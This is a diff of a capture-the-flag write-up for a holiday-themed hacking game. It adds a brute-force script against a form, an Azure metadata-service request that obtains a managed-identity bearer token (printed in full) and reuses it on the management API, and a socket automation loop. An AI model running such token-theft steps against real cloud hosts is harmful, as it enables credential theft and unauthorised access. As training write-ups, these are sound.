@@ -222,8 +222,6 @@ kill 12771
 
 I decided to take the easy way out and brute force this one. To brute force this, I utilized BurpSuite's proxy module to help capture a submission attempt. This helped me realize that for each of the 9 findings, they were simply included in the HTTP POST as input1 through input9. A valid finding was set to and a hallucination was set to 1.  
 
-
-
 I then utilized my good friend, ChatGPT, to quickly script up a bash script to automate brute forcing against the application. After a lot of debugging and trial and error, the below script ultimately worked. 
 
 ```bash
@@ -277,7 +275,6 @@ done
 
 echo "No successful combination found."
 exit 1
-
 ```
 
 Script output:
@@ -433,14 +430,11 @@ Attempt for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=0 - Response code: 400
 Retry for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=0
 Attempt for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=1 - Response code: 200
 Success for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=1
-
 ```
 
 After finding my successful combination, I re-launched the game and submitted a report with findings 3, 6, and 9 marked as hallucinations. 
 
 GLORY!
-
-
 
 ---
 
@@ -552,6 +546,83 @@ Domain: **ssh-server-vm.santaworkshopgeeseislands.org**
 Account: **monitor**
 
 Goal: **access TODO list**
+
+
+
+
+
+
+
+
+
+
+
+Generate access token
+
+```bash
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
+```
+
+Output
+
+```bash
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MDE5NzcsIm5iZiI6MTcwMjQwMTk3NywiZXhwIjoxNzAyNDg4Njc3LCJhaW8iOiJFMlZnWUZqbU5HLzd0VDNPZC9VbkIvZUhPQzFqQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQLWJ6M3dkTmVVcTg3U29SSHVSSUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.GNKxaoFJEZnWENNPHiIc1KZbUaUODbCYMIgTWUY-7pEhVp_VqT0dPeeXRGStfaWDs3NoRKy72jkacg-aDSsqLKLYUZmAZAe9BJGk8eEnO0xUWSIyoJmzgbGMkv2uk9lwYfOcVD_MtEj0_cP9XdkAuIN7tuLWyUc7EKfvo671gNZPBfHyLSZ1yekmrOJjvNyQ8bMNT7X4zEZEg0dKdnovOeXhJjeX_2abJv0I4ddtDN-Cm-DsVDc3OcgiZGB4G2l603qbsYobde41pMMqhsz1iGjtGNbMDQyky0zwQGFxNzMjlsgiC7J3zrvmcPe_dSJILQTE4MdnH1AdQYiTmBBW4Q","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85753","expires_on":"1702488677","ext_expires_in":"86399","not_before":"1702401977","resource":"https://management.azure.com/","token_type":"Bearer"}
+```
+
+Store token in result
+
+```bash
+result="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MDE5NzcsIm5iZiI6MTcwMjQwMTk3NywiZXhwIjoxNzAyNDg4Njc3LCJhaW8iOiJFMlZnWUZqbU5HLzd0VDNPZC9VbkIvZUhPQzFqQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQLWJ6M3dkTmVVcTg3U29SSHVSSUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.GNKxaoFJEZnWENNPHiIc1KZbUaUODbCYMIgTWUY-7pEhVp_VqT0dPeeXRGStfaWDs3NoRKy72jkacg-aDSsqLKLYUZmAZAe9BJGk8eEnO0xUWSIyoJmzgbGMkv2uk9lwYfOcVD_MtEj0_cP9XdkAuIN7tuLWyUc7EKfvo671gNZPBfHyLSZ1yekmrOJjvNyQ8bMNT7X4zEZEg0dKdnovOeXhJjeX_2abJv0I4ddtDN-Cm-DsVDc3OcgiZGB4G2l603qbsYobde41pMMqhsz1iGjtGNbMDQyky0zwQGFxNzMjlsgiC7J3zrvmcPe_dSJILQTE4MdnH1AdQYiTmBBW4Q"
+```
+
+Web Apps - Get Source Control
+
+```bash
+monitor@ssh-server-vm:~$ curl -X GET   "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" -H "Authorization: Bearer $result"Output reformatted to JSON
+```
+
+Output reformatted to JSON
+
+```bash
+{
+  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
+  "name": "northpole-ssh-certs-fa",
+  "type": "Microsoft.Web/sites/sourcecontrols",
+  "location": "East US",
+  "tags": {
+    "project": "northpole-ssh-certs",
+    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
+  },
+  "properties": {
+    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
+    "branch": "main",
+    "isManualIntegration": false,
+    "isGitHubAction": true,
+    "deploymentRollbackEnabled": false,
+    "isMercurial": false,
+    "provisioningState": "Succeeded",
+    "gitHubActionConfiguration": {
+      "codeConfiguration": null,
+      "containerConfiguration": null,
+      "isLinux": true,
+      "generateWorkflowFile": true,
+      "workflowSettings": {
+        "appType": "functionapp",
+        "publishType": "code",
+        "os": "linux",
+        "variables": {
+          "runtimeVersion": "3.11"
+        },
+        "runtimeStack": "python",
+        "workflowApiVersion": "2020-12-01",
+        "useCanaryFusionServer": false,
+        "authType": "publishprofile"
+      }
+    }
+  }
+}
+
+```
 
 ---
 
@@ -1561,5 +1632,15 @@ After inverting the minimap colors, ensuring the same size images, and overlayin
 ![](/docs/assets/images/Cyberheat.png)
 
 We now know we need to fish right under the head of the goose on Steampunk island to find this prestigious fish! 
+
+// Function to send a message through the socket function sendMessage(message) {
+ if (true === true) {
+ socket.send(message);
+ }
+} // Infinite loop sending 'cast' and 'reel' messages setInterval(function() {
+ sendMessage('cast');
+ // Delay for a short time before sending 'reel' setTimeout(function() {
+ sendMessage('reel');
+ }, 5000); // Adjust the delay as needed }, 5000); // Repeat every 60 seconds
 
 ---
